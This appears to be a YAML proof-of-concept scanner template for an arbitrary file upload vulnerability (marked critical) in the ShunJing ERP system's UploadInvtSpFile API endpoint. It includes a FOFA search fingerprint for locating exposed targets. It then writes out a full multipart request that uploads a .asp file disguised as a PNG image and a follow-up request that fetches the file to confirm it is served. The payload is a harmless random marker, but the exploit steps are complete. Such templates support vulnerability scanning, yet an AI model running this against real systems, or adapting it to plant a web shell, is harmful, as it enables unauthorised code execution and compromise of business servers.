id: poc-yaml-centersoft-uploadinvtspfile-anyfile-upload
info:
  name: 顺景ERP管理系统 UploadInvtSpFile 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: 顺景ERP管理系统
  fofa: body="/api/DBRecord/getDBRecords"
variables:
  t1: random_str(4)
  t2: base64(t1)
requests:
- method: POST
  path: /api/cgInvtSp/UploadInvtSpFile
  headers:
    Content-Type: multipart/form-data; boundary=-----------------1111
  data: '-------------------1111

    Content-Disposition: form-data; name="filedata"; filename="{{.t1}}.asp"

    Content-Type: image/png


    {{.t2}}

    -------------------1111--'
  expression: status_code == 200 && contains(body,".asp") && contains(body,"filepath")
  output:
  - regex_match(body,`InvtSpFiles\\\\(?P<filename>[0-9a-z-]+).asp`)
- method: GET
  path: /InvtSpFiles/{{.filename}}.asp
  expression: status_code == 200 && body == t2
transport: http
